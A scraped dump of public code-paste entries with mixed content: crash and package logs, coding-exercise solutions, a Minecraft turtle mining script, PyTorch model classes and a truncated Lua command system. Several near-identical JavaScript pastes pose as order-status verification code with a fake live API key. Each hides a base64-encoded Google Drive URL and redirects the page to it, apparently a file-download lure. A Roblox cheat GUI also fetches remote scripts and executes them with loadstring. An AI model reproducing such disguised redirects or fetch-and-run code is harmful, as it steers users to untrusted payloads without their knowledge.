        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
z1kCADMQ,2025-04-13T17:28:27.792868,powerampache,PHP,Sunday 13th of April 2025 10:28:27 AM CDT,"1.01-79-free (79) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
pZtna6C6,Market.js,WantingTrae,JavaScript,Sunday 13th of April 2025 10:19:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52824/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PJfvjgGr,31.YA,miglss,Python,Sunday 13th of April 2025 10:19:02 AM CDT,"def solution(grid: list) -> int:
    rows = len(grid)
    cols = len(grid[0])
    ans = 0
    seen = set()
    
    def validate(x, y):
        if x >= 0 and x < rows:
            if y >= 0 and y < cols:
                return True
        return False
    
    def dfs(row, col):
        stack = [(row, col)]
        while stack:
            x, y = stack.pop()
            
            for dx, dy in [(1, 0), (0, 1), (-1, 0), (0, -1)]:
                if validate(x+dx, y+dy):
                    if grid[x+dx][y+dy] == '1' and (x+dx, y+dy) not in seen:
                        seen.add((x+dx, y+dy))
                        stack.append((x+dx, y+dy))
    
    for row in range(rows):
        for col in range(cols):
            # –ù–∞—à–ª–∏ –æ—Å—Ç—Ä–æ–≤, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ –ø–æ—Å–µ—â–∞–ª–∏ —Ä–∞–Ω–µ–µ
            if grid[row][col] == '1' and (row, col) not in seen:
                ans += 1
                seen.add((row, col))
                dfs(row, col)
    
    return ans"
sdeK5itf,Chunk Wireless,ZGAMMAA,Lua,Sunday 13th of April 2025 10:12:19 AM CDT,"-- ‚úÖ CHUNK EATER w/ Rednet & Left-Chest Refuel

-- === CONFIG ===
local CHUNK_SIZE = 16
local LAYER_HEIGHT = 3
local FUEL_BUFFER = 100

-- === POSITION TRACKING ===
local x, y, z = 0, 0, 0
local dir = 1 -- 0=north, 1=east, 2=south, 3=west
local startX, startY, startZ, startDir = x, y, z, dir

-- === REDNET STATUS BROADCASTING ===
rednet.open(""left"") -- ‚ö†Ô∏è Set this to the side your modem is on
function status(msg)
  print(msg)
  rednet.broadcast(msg, ""chunkStatus"")
end

-- === DIRECTION HELPERS ===
local function turnRight() turtle.turnRight(); dir = (dir + 1) % 4 end
local function turnLeft() turtle.turnLeft(); dir = (dir - 1) % 4 end
local function face(target) while dir ~= target do turnRight() end end
local function faceExact(targetDir) while dir ~= targetDir do turnRight() end end
local function updatePosition(dx, dy, dz) x, y, z = x + dx, y + dy, z + dz end

-- === INVENTORY CHECK ===
local function isFull()
  for i = 1, 16 do
    if turtle.getItemCount(i) == 0 then return false end
  end
  return true
end

-- === GO TO COORDINATES ===
local function goTo(xT, yT, zT)
  while y < yT do turtle.down(); updatePosition(0, 1, 0) end
  while y > yT do turtle.up(); updatePosition(0, -1, 0) end

  face(1) while x < xT do turtle.forward(); updatePosition(1, 0, 0) end
  face(3) while x > xT do turtle.forward(); updatePosition(-1, 0, 0) end

  face(2) while z < zT do turtle.forward(); updatePosition(0, 0, 1) end
  face(0) while z > zT do turtle.forward(); updatePosition(0, 0, -1) end
end

-- === UNLOAD & REFUEL AT ORIGIN ===
local function returnToStartAndUnload()
  status(""üì¶ Returning to start to dump items and refuel"")
  goTo(startX, startY, startZ)
  faceExact(startDir)

  -- Dump behind
  turnLeft(); turnLeft()
  for i = 1, 16 do
    turtle.select(i)
    turtle.drop()
  end
  turnLeft(); turnLeft()
end

local function refuelFromInventory()
  for i = 1, 16 do
    turtle.select(i)
    if turtle.refuel(0) then
      turtle.refuel()
      return true
    end
  end
  return false
end

local function refuelFromLeftChest()
  turnLeft()
  status(""‚õΩ Attempting to refuel from left chest..."")
  for i = 1, 16 do
    turtle.select(i)
    if turtle.getFuelLevel() < turtle.getFuelLimit() then
      turtle.suck()
      if turtle.refuel(0) then
        turtle.refuel()
      else
        turtle.drop() -- not fuel, drop it
      end
    end
  end
  turnRight()
  status(""‚úÖ Refueled from left chest"")
end

local function checkFuel()
  local estReturn = math.abs(x - startX) + math.abs(y - startY) + math.abs(z - startZ) + FUEL_BUFFER
  if turtle.getFuelLevel() < estReturn then
    local sx, sy, sz, sd = x, y, z, dir
    status(""‚ö†Ô∏è Low fuel. Returning to refuel..."")
    returnToStartAndUnload()
    if not refuelFromInventory() then
      refuelFromLeftChest()
    end
    goTo(sx, sy, sz)
    faceExact(sd)
  end
end

-- === MOVEMENT ===
local function tryForward()
  if isFull() then
    status(""üì¶ Inventory full. Returning to dump..."")
    local sx, sy, sz, sd = x, y, z, dir
    returnToStartAndUnload()
    checkFuel()
    goTo(sx, sy, sz)
    faceExact(sd)
  end

  checkFuel()
  while not turtle.forward() do
    turtle.dig()
    sleep(0.3)
  end
  turtle.digUp()
  turtle.digDown()
  if dir == 0 then updatePosition(0, 0, -1)
  elseif dir == 1 then updatePosition(1, 0, 0)
  elseif dir == 2 then updatePosition(0, 0, 1)
  elseif dir == 3 then updatePosition(-1, 0, 0)
  end
end

local function tryUp()
  checkFuel()
  while not turtle.up() do
    turtle.digUp()
    sleep(0.3)
  end
  updatePosition(0, -1, 0)
end

local function tryDown()
  checkFuel()
  while not turtle.down() do
    turtle.digDown()
    sleep(0.3)
  end
  updatePosition(0, 1, 0)
end

-- === DIG LAYER ===
local function digLayer()
  status(""‚õè Digging layer at Y="" .. y)
  for row = 1, CHUNK_SIZE do
    for col = 1, CHUNK_SIZE - 1 do
      tryForward()
    end
    if row < CHUNK_SIZE then
      if row % 2 == 1 then
        turnRight(); tryForward(); turnRight()
      else
        turnLeft(); tryForward(); turnLeft()
      end
    end
  end

  -- Return to origin column
  if x > 0 then face(3) while x > 0 do turtle.forward(); updatePosition(-1, 0, 0) end end
  if x < 0 then face(1) while x < 0 do turtle.forward(); updatePosition(1, 0, 0) end end
  if z > 0 then face(0) while z > 0 do turtle.forward(); updatePosition(0, 0, -1) end end
  if z < 0 then face(2) while z < 0 do turtle.forward(); updatePosition(0, 0, 1) end end
  face(1)
end

-- === MAIN ===
startX, startY, startZ, startDir = x, y, z, dir

print(""Enter depth to dig:"")
local depth = tonumber(read())
if not depth or depth <= 0 then
  print(""‚ùå Invalid depth."")
  return
end

status(""üöß Beginning chunk excavation to depth "" .. depth)

for layer = 1, depth, LAYER_HEIGHT do
  digLayer()
  if layer + LAYER_HEIGHT <= depth then
    status(""‚¨áÔ∏è Descending to next layer..."")
    for i = 1, LAYER_HEIGHT do tryDown() end
  end
end

returnToStartAndUnload()
status(""‚úÖ Chunk excavation complete."")
"
87uM5jKa,update1304,fornakter,Bash,Sunday 13th of April 2025 10:09:41 AM CDT,"Start-Date: 2025-04-13  07:26:25
Commandline: aptkit role='role-install-packages' sender=':1.95'
Upgrade: firefox-locale-en:amd64 (137.0+linuxmint1+xia, 
137.0.1+linuxmint1+xia), 
firefox-locale-pl:amd64 (137.0+linuxmint1+xia, 137.0.1+linuxmint1+xia), 
libsnmp-base:amd64 (5.9.4+dfsg-1.1ubuntu3, 
5.9.4+dfsg-1.1ubuntu3.1), 
libctf-nobfd0:amd64 (2.42-4ubuntu2.4, 2.42-4ubuntu2.5), 
libfprint-2-2:amd64 (1:1.94.7+tod1-0ubuntu5~24.04.2, 1:1.94.7+tod1-0ubuntu5~24.04.3), 
libpoppler-cpp0t64:amd64 (24.02.0-1ubuntu9.2, 24.02.0-1ubuntu9.3), 
xxd:amd64 (2:9.1.0016-1ubuntu7.7, 2:9.1.0016-1ubuntu7.8), 
libsnmp40t64:amd64 (5.9.4+dfsg-1.1ubuntu3, 5.9.4+dfsg-1.1ubuntu3.1), 
libexpat1:amd64 (2.6.1-2ubuntu0.2, 2.6.1-2ubuntu0.3), 
libexpat1:i386 (2.6.1-2ubuntu0.2, 2.6.1-2ubuntu0.3), 
libbinutils:amd64 (2.42-4ubuntu2.4, 2.42-4ubuntu2.5), 
libsoup-gnome-2.4-1:amd64 (2.74.3-6ubuntu1.1, 2.74.3-6ubuntu1.2), 
vim-common:amd64 (2:9.1.0016-1ubuntu7.7, 2:9.1.0016-1ubuntu7.8), 
pci.ids:amd64 (0.0~2024.03.31-1, 0.0~2024.03.31-1ubuntu0.1), 
binutils-x86-64-linux-gnu:amd64 (2.42-4ubuntu2.4, 2.42-4ubuntu2.5), 
poppler-utils:amd64 (24.02.0-1ubuntu9.2, 24.02.0-1ubuntu9.3), 
libsoup2.4-common:amd64 (2.74.3-6ubuntu1.1, 2.74.3-6ubuntu1.2), 
libsoup-2.4-1:amd64 (2.74.3-6ubuntu1.1, 2.74.3-6ubuntu1.2), 
firefox:amd64 (137.0+linuxmint1+xia, 137.0.1+linuxmint1+xia), 
libsoup-3.0-0:amd64 (3.4.4-5ubuntu0.1, 3.4.4-5ubuntu0.2), 
thunderbird-locale-en:amd64 (1:128.9.0esr+linuxmint1+xia, 1:128.9.1esr+linuxmint1+xia), 
thunderbird-locale-pl:amd64 (1:128.9.0esr+linuxmint1+xia, 1:128.9.1esr+linuxmint1+xia), 
linux-base:amd64 (4.5ubuntu9, 4.5ubuntu9+24.04.1), 
libfprint-2-tod1:amd64 (1:1.94.7+tod1-0ubuntu5~24.04.2, 
1:1.94.7+tod1-0ubuntu5~24.04.3), 
vim-tiny:amd64 (2:9.1.0016-1ubuntu7.7, 2:9.1.0016-1ubuntu7.8), 
libctf0:amd64 (2.42-4ubuntu2.4, 2.42-4ubuntu2.5), 
libpoppler134:amd64 (24.02.0-1ubuntu9.2, 24.02.0-1ubuntu9.3), 
linux-firmware:amd64 (20240318.git3b128b60-0ubuntu2.10, 20240318.git3b128b60-0ubuntu2.11), 
binutils-common:amd64 (2.42-4ubuntu2.4, 2.42-4ubuntu2.5), 
libsframe1:amd64 (2.42-4ubuntu2.4, 2.42-4ubuntu2.5), 
libgprofng0:amd64 (2.42-4ubuntu2.4, 2.42-4ubuntu2.5), 
libsoup-3.0-common:amd64 (3.4.4-5ubuntu0.1, 3.4.4-5ubuntu0.2), 
gir1.2-soup-2.4:amd64 (2.74.3-6ubuntu1.1, 2.74.3-6ubuntu1.2), 
gir1.2-soup-3.0:amd64 (3.4.4-5ubuntu0.1, 3.4.4-5ubuntu0.2), 
libpoppler-glib8t64:amd64 (24.02.0-1ubuntu9.2, 24.02.0-1ubuntu9.3), 
thunderbird-locale-en-us:amd64 (1:128.9.0esr+linuxmint1+xia, 1:128.9.1esr+linuxmint1+xia), 
binutils:amd64 (2.42-4ubuntu2.4, 2.42-4ubuntu2.5), signal-desktop:amd64 (7.48.0, 7.50.0)
End-Date: 2025-04-13  07:26:57"
p1ftkaw6,Untitled,WantingTrae,JavaScript,Sunday 13th of April 2025 10:03:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15845/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rUKSY6vY,Products.js,WantingTrae,JavaScript,Sunday 13th of April 2025 09:47:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42806/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ccyynrvp,Question 3 Protyay,Protyay77,C++,Sunday 13th of April 2025 09:40:27 AM CDT,"#include <bits/stdc++.h>
using namespace std;

long getMaximumPrizes(string inputString) {
    long countA = 0, countAM = 0, countAMZ = 0;
    long maxPrizes = 0;

    // Traverse the string to count ""A"", ""AM"", and ""AMZ"" subsequences
    for (char c : inputString) {
        if (c == 'Z') {
            countAMZ += countAM;  // Every ""AM"" can form an ""AMZ"" when followed by ""Z""
        }
        if (c == 'M') {
            countAM += countA;  // Every ""A"" can form an ""AM"" when followed by ""M""
        }
        if (c == 'A') {
            countA++;  // Count of ""A""s found
        }
    }

    // Initially, the count of ""AMZ"" subsequences without adding any letter
    maxPrizes = countAMZ;

    // Try adding each letter ('A', 'M', 'Z') and calculate the maximum result
    // Add 'A' - This will start new ""AMZ"" subsequences from ""AMZ"" found earlier
    maxPrizes = max(maxPrizes, countAMZ + countA);

    // Add 'M' - This will complete ""A""s into ""AM"" subsequences
    maxPrizes = max(maxPrizes, countAMZ + countA);

    // Add 'Z' - This will complete ""AM""s into ""AMZ"" subsequences
    maxPrizes = max(maxPrizes, countAMZ + countAM);

    return maxPrizes;
}

// int main() {
//     // Sample Test Cases
//     string inputString = ""AKMMZ"";
//     cout << getMaximumPrizes(inputString) << endl;  // Expected output: 4
    
//     string inputString2 = ""AZ"";
//     cout << getMaximumPrizes(inputString2) << endl;  // Expected output: 1

//     return 0;
// }
"
fEMtndgL,Untitled,aquiem,Python,Sunday 13th of April 2025 09:33:49 AM CDT,"import torch.nn as nn
from abc import ABC, abstractmethod

class BaseModel(nn.Module, ABC):
    def __init__(self):
        super(BaseModel, self).__init__()

    @abstractmethod
    def forward(self, x):
        pass

    def freeze(self):
        for param in self.parameters():
            param.requires_grad = False

    def unfreeze(self):
        for param in self.parameters():
            param.requires_grad = True


#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------


import torch
from models.base import BaseModel
import torch.nn as nn
import torch.nn.functional as F

class Decoder(BaseModel):
    def __init__(self, latent_dim):
        super(Decoder, self).__init__()

        self.fc_layers = nn.Sequential(
            nn.Linear(latent_dim, 512),
            nn.ReLU(),
            nn.Linear(512, 1024),
            nn.ReLU(),
            nn.Linear(1024, 256 * 8 * 8),
            nn.ReLU()
        )

        self.deconv_layers = nn.Sequential(
            nn.ConvTranspose2d(256, 128, kernel_size=4, stride=2, padding=1),  
            nn.ReLU(),
            nn.ConvTranspose2d(128, 64, kernel_size=4, stride=2, padding=1),   
            nn.ReLU(),
            nn.ConvTranspose2d(64, 32, kernel_size=4, stride=2, padding=1),    
            nn.ReLU(),
            nn.ConvTranspose2d(32, 3, kernel_size=4, stride=2, padding=1),     
            nn.Tanh()
        )

    def forward(self, z):
        x = self.fc_layers(z)
        x = x.view(-1, 256, 8, 8)
        x = self.deconv_layers(x)
        return x

#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------

from models.base import BaseModel
import torch.nn.functional as F
import torch.nn as nn

class Encoder(BaseModel):
    def __init__(self, latent_dim):
        super(Encoder, self).__init__()
        self.conv_layers = nn.Sequential(
            nn.Conv2d(3, 32, kernel_size=4, stride=2, padding=1),
            nn.ReLU(),
            nn.Conv2d(32, 64, kernel_size=4, stride=2, padding=1),
            nn.ReLU(),
            nn.Conv2d(64, 128, kernel_size=4, stride=2, padding=1),
            nn.ReLU(),
            nn.Conv2d(128, 256, kernel_size=4, stride=2, padding=1), 
            nn.ReLU()
        )

        self.fc_layers = nn.Sequential(
            nn.Flatten(),
            nn.Linear(256 * 8 * 8, 1024),
            nn.ReLU(),
            nn.Linear(1024, 512),
            nn.ReLU(),
            nn.Linear(512, latent_dim)
        )


    def forward(self, x):
        x = self.conv_layers(x)
        x = self.fc_layers(x)
        return x


#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------

import torch
import torch.nn as nn

class Discriminator(nn.Module):
    def __init__(self, latent_dim):
        super(Discriminator, self).__init__()
        self.model = nn.Sequential(
            nn.Linear(latent_dim, 256),
            nn.ReLU(),
            nn.Linear(256, 1),
            nn.Sigmoid()
        )

    def forward(self, z):
        return self.model(z)

#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------

import torch
import torch.nn as nn

class Classifier(nn.Module):
    def __init__(self, latent_dim, num_classes):
        super(Classifier, self).__init__()
        self.model = nn.Sequential(
            nn.Linear(latent_dim, 256),
            nn.ReLU(),
            nn.Linear(256, num_classes)
        )

    def forward(self, z):
        return self.model(z)

"
CUELg7Ck,Order.js,WantingTrae,JavaScript,Sunday 13th of April 2025 09:31:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97868/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zME1hBvg,Uhhh my roblox script (dead rails),Lee_everitt,Lua,Sunday 13th of April 2025 09:30:55 AM CDT,"-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local UIAspectRatioConstraint = Instance.new(""UIAspectRatioConstraint"")
local TextLabel = Instance.new(""TextLabel"")
local TextLabel1 = Instance.new(""TextLabel"")
local TextButton = Instance.new(""TextButton"")
local TextButton1 = Instance.new(""TextButton"")
local TextButton2 = Instance.new(""TextButton"")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.252590686, 0, 0.288844615, 0)
Frame.Size = UDim2.new(0, 331, 0, 211)
Frame.Active = true
Frame.Draggable = true

UIAspectRatioConstraint.Parent = Frame
UIAspectRatioConstraint.AspectRatio = 1.569

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 17, 255)
TextLabel.BorderColor3 = Color3.fromRGB(255, 96, 96)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 331, 0, 50)
TextLabel.Font = Enum.Font.Unknown
TextLabel.LineHeight = 2.530
TextLabel.Text = ""Free diddy (supports all executors btw)""
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 29.000

TextLabel1.Name = ""TextLabel1""
TextLabel1.Parent = Frame
TextLabel1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel1.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel1.BorderSizePixel = 0
TextLabel1.Position = UDim2.new(0, 0, 0.763033152, 0)
TextLabel1.Size = UDim2.new(0, 331, 0, 50)
TextLabel1.Font = Enum.Font.SourceSans
TextLabel1.Text = ""Gui Made By lee_everitt             Scripts Made By ringta.\\n In discord""
TextLabel1.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel1.TextSize = 14.000

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0362537764, 0, 0.388625592, 0)
TextButton.Size = UDim2.new(0, 57, 0, 49)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = ""Castle""
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000

TextButton1.Name = ""TextButton1""
TextButton1.Parent = Frame
TextButton1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton1.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton1.BorderSizePixel = 0
TextButton1.Position = UDim2.new(0.271903336, 0, 0.388625592, 0)
TextButton1.Size = UDim2.new(0, 48, 0, 50)
TextButton1.Font = Enum.Font.SourceSans
TextButton1.Text = ""Fort""
TextButton1.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton1.TextSize = 14.000

TextButton2.Name = ""TextButton2""
TextButton2.Parent = Frame
TextButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton2.BorderSizePixel = 0
TextButton2.Position = UDim2.new(0.462235659, 0, 0.388625592, 0)
TextButton2.Size = UDim2.new(0, 58, 0, 50)
TextButton2.Font = Enum.Font.SourceSans
TextButton2.Text = ""Auto End""
TextButton2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton2.TextSize = 14.000
TextButton.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(""https://raw.githubusercontent.com/ringtaa/castletpfast.github.io/refs/heads/main/FASTCASTLE.lua""))()
end)
TextButton1.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(""https://raw.githubusercontent.com/ringtaa/Tpfort.github.io/refs/heads/main/Tpfort.lua""))()

end)
TextButton2.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(""https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails""))()

end)"
p0V2AW7n,Question 2 Protyay,Protyay77,C++,Sunday 13th of April 2025 09:16:54 AM CDT," // Sort the rides by their start times
    vector<pair<int, int>> landRides;
    vector<pair<int, int>> waterRides;
    
    int n = landStartTime.size();
    int m = waterStartTime.size();
    
    for (int i = 0; i < n; ++i) {
        landRides.push_back({landStartTime[i], landDuration[i]});
    }
    
    for (int i = 0; i < m; ++i) {
        waterRides.push_back({waterStartTime[i], waterDuration[i]});
    }

    sort(landRides.begin(), landRides.end());
    sort(waterRides.begin(), waterRides.end());

    // Option 1: Start with a land ride, then a water ride
    int earliestTime1 = INT_MAX;
    for (auto& land : landRides) {
        for (auto& water : waterRides) {
            if (land.first + land.second <= water.first) {  // After land, can start water
                earliestTime1 = min(earliestTime1, water.first + water.second);
                break;  // Water is already sorted, no need to check further
            }
        }
    }

    // Option 2: Start with a water ride, then a land ride
    int earliestTime2 = INT_MAX;
    for (auto& water : waterRides) {
        for (auto& land : landRides) {
            if (water.first + water.second <= land.first) {  // After water, can start land
                earliestTime2 = min(earliestTime2, land.first + land.second);
                break;  // Land is already sorted, no need to check further
            }
        }
    }

    // Return the earliest time among both options
    return min(earliestTime1, earliestTime2);"
YKK3gid8,Market.js,WantingTrae,JavaScript,Sunday 13th of April 2025 09:16:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72794/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zrxACutZ,Untitled,Aoki1337,Lua,Sunday 13th of April 2025 09:11:35 AM CDT,"local function expect( value, name, expectedType )
    local actualType = type( value )

    if actualType != expectedType then
        error( string.format( 'TypeError: parameter %s has wrong type (%s expected, got %s)', name, expectedType, actualType ) )
    end
end

CommandManager = {
    prefixKeyword = 'aoki',
    prefixes = {
        '/',
        '!',
        '.',
    },
    commands = {},
    addCommand = function( params )
        expect( params.name, 'name', 'string' )
        expect( params.args, 'args', 'string' )
        expect( params.description, 'description', 'string' )
        expect( params.localPlayerOnly or false, 'localPlayerOnly', 'boolean' )
        expect( params.friendsOnly or false, 'friendsOnly', 'boolean' )
        expect( params.callback, 'callback', 'function' )

        CommandManager.commands[params.name:lower()] = {
            name = params.name,
            args = params.args,
            description = params.description,
            localPlayerOnly = params.localPlayerOnly,
            friendsOnly = params.friendsOnly,
            callback = params.callback,
        }
    end,
    subPrefix = function( text )
        local usedPrefix = nil

        for _, prefix in ipairs( CommandManager.prefixes ) do
            if string.StartsWith( text, prefix ) then
                usedPrefix = prefix
                break
            end
        end

        if usedPrefix then
            return string.TrimLeft( string.sub( text, #usedPrefix + 1 ) )
        end
    end,
    parseArgs = function( stringArgs )
        local args = string.Explode( '%s+', stringArgs, true )
        local cmd = table.remove( args, 1 ):lower()

